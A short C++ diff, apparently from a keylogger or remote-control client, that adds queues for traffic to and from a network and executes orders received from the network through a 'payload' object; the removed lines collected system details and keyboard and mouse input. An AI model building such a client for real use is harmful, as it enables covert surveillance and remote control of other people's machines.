@@ -43,17 +43,19 @@ Core::~Core()
     m_payload->deinit();
 }
 
+mt::Queue<SystemMsg> &Core::getSendToNetwork()
+{
+    return m_sendToNetwork;
+}
+
+mt::Queue<library::IPayload::Order> &Core::getReceivedFromNetwork()
+{
+    return *m_receivedFromNetwork;
+}
+
 int Core::run()
 {
     using namespace std::chrono_literals;
-
-    {
-        library::SystemInfos const &infos = m_payload->getInfos();
-
-        nope::log::Log(Info) << "ProcessorArchitecture: " << (int)infos.pArch << "\nArchitecture:         " << (int)infos.arch << "\nOperating System:     " << (int)infos.os << "\nPage Size:            " << infos.pageSize << "\nCPUs:                 " << infos.nbProc << "\nRAM:                  " << infos.ram << "Mb";
-    }
-    m_payload->getKeyboard();
-    m_payload->getMouse();
 
     while (1)
     {
@@ -66,10 +68,12 @@ int Core::run()
         // Get requests from network
         while (!m_receivedFromNetwork->empty())
         {
-            SystemMsg msg = m_receivedFromNetwork->front();
-            // Execute needed action
-            // TODO
+            library::IPayload::Order msg = m_receivedFromNetwork->front();
 
+            // Execute needed action
+            m_payload->exec(msg);
+
+            // Suppress data from the queue
             m_receivedFromNetwork->pop();
         }
         m_payload->run();
